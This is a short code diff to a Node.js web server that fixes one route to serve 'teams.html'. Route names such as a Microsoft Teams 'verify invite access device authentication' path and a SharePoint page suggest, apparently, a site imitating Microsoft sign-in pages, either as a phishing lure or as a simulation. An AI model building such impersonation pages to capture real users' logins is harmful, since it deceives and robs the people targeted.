@@ -551,7 +551,7 @@ const server = http.createServer(async (req, res) => {
     return serveHtml(res, 'sharepoint.html');
   }  
   if (decodedUrl === '/microsoft-teams%verify%invite%access%device%authentication') {
-      return serveHtml(res, '.html');
+      return serveHtml(res, 'teams.html');
     } 
 
   // Mail client — protected: redirect to /admin if no valid session
